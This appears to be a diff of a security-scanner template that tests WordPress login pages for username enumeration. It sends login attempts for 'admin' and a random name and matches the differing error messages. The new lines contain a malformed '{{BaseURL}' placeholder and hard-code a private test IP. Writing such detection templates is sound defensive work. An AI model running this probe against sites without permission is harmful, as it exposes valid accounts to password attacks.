@@ -1,72 +1,40 @@
 id:  wp-user-enum-login
 
 info:
-  name: WordPress User Enumeration via Login Page
+  name: WordPress User Enumeration via the Login Page/Form
   author: Caddyshack2175
-  severity: low
-
+  severity: medium
+  description: By analysing the login page error responses it is possible to identify application or WordPress users by for a valid vs an invalid account error.
+  reference:
+    - https://melapress.com/enumerate-wordpress-users-wpscan-security-scanner/
+    - https://medium.com/@ahmed_elhady/wordpress-username-enumeration-techniques-2ca0510df632
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+  tags: information, discloser, wordpress, enum, enumeration, users
 
 http:
   - raw:
       - |+
-        GET /wp-login.php HTTP/1.1
-        Host: {{Host}}
-        Upgrade-Insecure-Requests: 1
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-        Accept-Encoding: gzip, deflate, br
-        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-        Connection: close
-    
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '<title>Log In '
-          - ' WordPress</title>'
-          - 'Username or Email Address'
-        condition: and
-      - type: status
-        status:
-          - 200
-      
-    extractors:
-      - type: regex
-        name: Login Page Found
-        part: body
-        group: 1
-        regex:
-          - '<title>(Log In .* WordPress)</title>'
-  
-  - raw:
-      - |+
         POST /wp-login.php HTTP/1.1
         Host: {{Host}}
-        Content-Length: 99
-        Cache-Control: max-age=0
-        Upgrade-Insecure-Requests: 1
-        Origin: {{BaseURL}}
+        Origin: {{BaseURL}
         Content-Type: application/x-www-form-urlencoded
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-        Referer: {{BaseURL}}/wp-login.php
-        Accept-Encoding: gzip, deflate, br
-        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-        Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US
+        Cookie: wp_lang=en_US; wp-settings-time-1=1711725482; wordpress_test_cookie=WP+Cookie+check
         Connection: close
+        Content-Length: 99
 
-        log=admin&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.117.1.96%2Fwp-admin%2F&testcookie=1
+        log=admin&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.117.1.59%2Fwp-admin%2F&testcookie=1
     
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - '<title>Log In '
-          - ' WordPress</title>'
+          - 'Lost your password?'
           - 'Username or Email Address'
-          - '<div id="login_error">	<strong>Error:</strong> The password you entered for the username <strong>'
+          - 'The password you entered for the username <strong>'
         condition: and
       - type: status
         status:
@@ -78,38 +46,32 @@ http:
         part: body
         group: 1
         regex:
-          - '<div id="login_error">	<strong>Error:</strong> (The password you entered for the username <strong>(.*)</strong> is incorrect.)'
+          - 'The password you entered for the username <strong>(.*)</strong> is incorrect.'
   
   - raw:
       - |+
         POST /wp-login.php HTTP/1.1
         Host: {{Host}}
-        Content-Length: 99
-        Cache-Control: max-age=0
-        Upgrade-Insecure-Requests: 1
-        Origin: {{BaseURL}}
+        Origin: {{BaseURL}
         Content-Type: application/x-www-form-urlencoded
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-        Referer: {{BaseURL}}/wp-login.php
-        Accept-Encoding: gzip, deflate, br
-        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-        Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US
+        Cookie: wp_lang=en_US; wp-settings-time-1=1711725482; wordpress_test_cookie=WP+Cookie+check
         Connection: close
+        Content-Length: 99
 
-        log=randomu345763537&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.117.1.96%2Fwp-admin%2F&testcookie=1
+        log=random1234642562117&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.117.1.59%2Fwp-admin%2F&testcookie=1
     
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - '<title>Log In '
-          - ' WordPress</title>'
+          - 'Lost your password?'
           - 'Username or Email Address'
+          - '<strong>ERROR</strong>: Invalid username.'
           - '<div id="login_error">	<strong>Error:</strong> The username <strong>'
           - '</strong> is not registered on this site. If you are unsure of your username, try your email address instead.<br />'
-        condition: and
+        condition: or
       - type: status
         status:
           - 200
@@ -121,3 +83,4 @@ http:
         group: 1
         regex:
           - '(The username <strong>(.*)</strong> is not registered on this site.)'
+          - '<div id="login_error">	<strong>ERROR</strong>: (.*). <a href='
